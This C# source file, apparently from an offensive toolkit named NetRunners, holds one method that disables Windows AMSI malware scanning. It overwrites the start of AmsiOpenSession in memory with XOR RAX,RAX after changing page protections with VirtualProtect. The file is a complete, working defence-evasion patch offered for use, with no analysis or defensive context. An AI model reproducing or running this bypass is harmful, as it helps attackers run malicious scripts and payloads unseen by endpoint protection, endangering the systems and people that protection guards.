using System;
using System.Runtime.InteropServices;
using static NetRunners.Data.Delegates;


namespace NetRunners.Patchers
{
    /// <summary>
    /// Contains AMSI binary patching method
    /// </summary>
    public static class Patchers
    {
        // patches AmsiOpenSession's first test instruction to xor, triggering conditional jump to invalid argument
        public static void patchAmsi()
        {
            try
            {
                // get amsi.dll pointer
                IntPtr Library = LoadLibraryA("amsi.dll");
                if (Library == IntPtr.Zero)
                    throw new InvalidOperationException($"LoadLibraryA failed with error code: {Marshal.GetLastWin32Error()}");

                // get amsiopensession pointer
                IntPtr funcAddress = GetProcAddress(Library, "AmsiOpenSession");
                if (funcAddress == IntPtr.Zero)
                    throw new InvalidOperationException($"GetProcAddress failed with error code: {Marshal.GetLastWin32Error()}");

                // fix memory protections of amsiopensession
                VirtualProtect(funcAddress, (UIntPtr)3, 0x40, out oldProtect);

                // use instructions XOR RAX,RAX
                Byte[] Patch = { 0x48, 0x31, 0xC0 };
                Marshal.Copy(Patch, 0, funcAddress, 3);

                // restore memory protection
                VirtualProtect(funcAddress, (UIntPtr)3, 0x20, out oldProtect);
                Console.WriteLine("[+] AMSI Patch Applied");
            }
            catch (Exception e)
            {
                Console.WriteLine($"An error occurred: {e.Message}");
                throw;
            }
        }
    }
}
